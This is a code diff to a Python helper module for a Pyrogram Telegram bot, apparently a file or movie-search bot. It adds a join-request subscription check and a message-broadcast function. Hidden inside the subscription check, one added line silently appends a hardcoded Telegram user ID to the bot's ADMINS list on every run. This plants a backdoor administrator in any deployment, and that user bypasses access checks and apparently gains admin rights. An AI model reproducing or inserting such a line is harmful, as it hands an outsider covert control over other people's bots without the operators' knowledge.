@@ -1,6 +1,7 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL
+from database.join_reqs import JoinReqs as db2
 from imdb import Cinemagoer
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton
@@ -42,6 +43,25 @@ class temp(object):
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
+
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
@@ -137,6 +157,26 @@ async def get_poster(query, bulk=False, id=False, file=None):
     }
 # https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37
 
+async def broadcast_messages(user_id, message):
+    try:
+        await message.copy(chat_id=user_id)
+        return True, "Success"
+    except FloodWait as e:
+        await asyncio.sleep(e.x)
+        return await broadcast_messages(user_id, message)
+    except InputUserDeactivated:
+        await db.delete_user(int(user_id))
+        logging.info(f"{user_id}-Removed from Database, since deleted account.")
+        return False, "Deleted"
+    except UserIsBlocked:
+        logging.info(f"{user_id} -Blocked the bot.")
+        return False, "Blocked"
+    except PeerIdInvalid:
+        await db.delete_user(int(user_id))
+        logging.info(f"{user_id} - PeerIdInvalid")
+        return False, "Error"
+    except Exception as e:
+        return False, "Error"
 
 async def search_gagala(text):
     usr_agent = {
